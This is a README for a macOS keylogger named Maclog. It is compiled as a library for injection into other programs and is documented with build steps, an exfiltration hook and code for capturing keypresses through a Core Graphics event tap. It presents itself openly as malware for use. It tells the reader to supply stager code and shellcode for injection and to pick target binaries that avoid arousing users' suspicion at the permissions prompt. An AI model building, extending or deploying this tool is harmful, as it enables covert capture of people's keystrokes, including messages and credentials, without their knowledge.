# Maclog

A lightweight keylogger for macOS that abuses deprecated frameworks Apple's stuck with.

### Prerequisites

A system running macOS version >= 10.4, the Apple LLVM compiler, and GNU Make.

### Building

Enter the project's top-level directory and compile the project with Make:

```
$ make
```

This will compile the following binaries:

* `./lib/libmaclog.dylib`
	- Maclog is compiled as dynamic library that's designed to be injected into Mach-O binaries. Therefore, in order to use Maclog effectively, you need to know how to write stager code and shellcode to facillitate dylib injection.
* `./bin/maclog-test`
	- A sample executable that links the Maclog dynamic library. If you haven't hooked in your own data exfiltration solution, running this executable will output UTF-8 representations of keystrokes to standard output.

### Configuring Data Exfiltration

The `./src/maclog.c` file contains the following function to allow you to hook in your chosen data exfiltration solution:

```
/*
 * A function that allows you to hook in your chosen data exfiltration soultion.
 */
static void exfil_hook(char *keystroke, size_t size)
{

	// Replace this code
	printf("%s\n", keystroke);
}
```

By default, Maclog will log keystrokes to standard output.

## How it Works

When you register an event tap, you supply a bit mask that identifies the set of events to be observed. To create the bit mask, use the CGEventMaskBit macro to convert each constant into an event mask and then OR the individual masks together.

```
CGEventMask trackedEvents = CGEventMaskBit(kCGEventKeyDown)
```

Before going further you should have a basic understanding of mach ports and how they are used by macOS. Mach ports are a kernel-provided inter-process communication (IPC) mechanism that's used extensively throughout macOS. They are unidirectional kernel-protected channels and can have multiple send-points but only one receive point. A Core Foundation mach port represents the new event tap, or NULL if the event tap could not be created. We pass a callback function, `log_keystrokes`, to the event tap, which contains logic to capture key press events and pass UTF-8 characters associated with those events to your data exfiltration solution of choice.

```
CFMachPortRef eventTap = CGEventTapCreate(kCGSessionEventTap,
					  kCGHeadInsertEventTap,
					  kCGEventTapOptionDefault,
					  trackedEvents,
					  log_keystroke,
					  NULL);
```

The newly created event tap will immediately register events if the target binary already has accessibility permissions. If it doesn't have permissions, macOS will prompt the user to enable permissions for the binary. Therefore, when considering binaries for injection, you want to select a target that either already has accessibility permissions, or one that is less likely to arouse suspicion when users are prompted.
<br>

Now that we have our event tap, we need to add it to our thread's run loop. CoreFoundation provides run loop objects that allow you to configure and manage a thread's run loop. There is a lot of documentation out there on how run loops work in macOS, but this explanation will only cover how they are used in context of this code. Getting into the details is beyond the scope of this explanation, but I encourage you to look that up on your own, they are not very difficult to understand.
<br>

The event tap can be passed to the `CFMachPortCreateRunLoopSource` function to generate a `CFRunLoopSource` object, which is is an abstraction of an input source (the event tap) that can be put into a run loop. A `CFRunLoopSourceRef` structure must be used to reference the `CFRunLoopSource` object.

```
CFRunLoopSourceRef runloop_src = CFMachPortCreateRunLoopSource(kCFAllocatorDefault,
							       event_tap,
							       0);
```

Next, we will take that `CFRunLoopSource` object and add it to a run loop mode. A run loop mode is a collection of input sources and timers to be monitored and a collection of run loop observers to be notified. When a run loop is run, a mode in which it is run is specified, either explicitly or implicitly. During a pass of the run loop, only input sources, such as a mouse click or a keystroke, associated with that mode are allowed to deliver their events. If an input source is not allowed to deliver its event during the current pass, it will wait for a subsequent pass of the run loop to enter a mode in which delivery is permitted.
<br>

Modes are used to filter out events from unwanted input sources during a particular pass through a run loop. In our case we are not interested in filtering out events but instead in making sure that events tapped by our input source, a `CFRunLoopSource` object, can be delivered to our run loop regardless of the mode it is currently in. We add our input source to the run loop with the `CFRunLoopAddSource` function and pass it the constant `CFRunLoopCommonModes`, a collection of commonly used modes defined by the CoreFoundation framework, to ensure that our input source will deliver keystroke events in these modes.

```
CFRunLoopAddSource(CFRunLoopGetCurrent(),
		   runloop_src,
		   kCFRunLoopCommonModes);
```

The CFRunLoopRun function runs the run loop we previously configured indefinitely in our processes's current thread. The run loop may be stopped with a call to the CFRunLoopStop function or if the process is ended/killed.

```
CFRunLoopRun();
```

It is important to note that Maclog cannot log keystrokes in secure text fields, like those used for password input, that are owned by other processes. In macOS, the AppKit framework provides an `NSSecureTextField` class, which inherits from the `NSTextField` class. Apple being Apple, the documentation on how this works is sparse. I assume however that it provides a similar functionality to the `EnableSecureEventInput` function provided by the deprecated Carbon framework, which essentially creates a secure communication channel where keyboard events are delivered to and only to the process associated with the textfield identified for secure input entry. Any attempt by another process (i.e. our target binary) to access these events will be blocked. This is not a security feature specific to macOS; I do not know of an operating system that does not employ something like this.
<br>

While this explanation does not cover everything in the code, it does explain the core concepts behind it.

## Built With

* [CoreFoundation](https://developer.apple.com/documentation/corefoundation) - Framework that provides fundamental software services useful to application services, application environments, and to applications themselves.
* [CoreGraphics](https://developer.apple.com/documentation/applicationservices) - Framework based on the Quartz advanced drawing engine.
* [Carbon](https://developer.apple.com/library/content/navigation/index.html?filter=carbon) - Framework that provides TIS functions to translate key codes into Unicode characters (Carbon is depreciated and Apple no longer provides most of the documentation for it, so going through its header files and some googling is necessary).

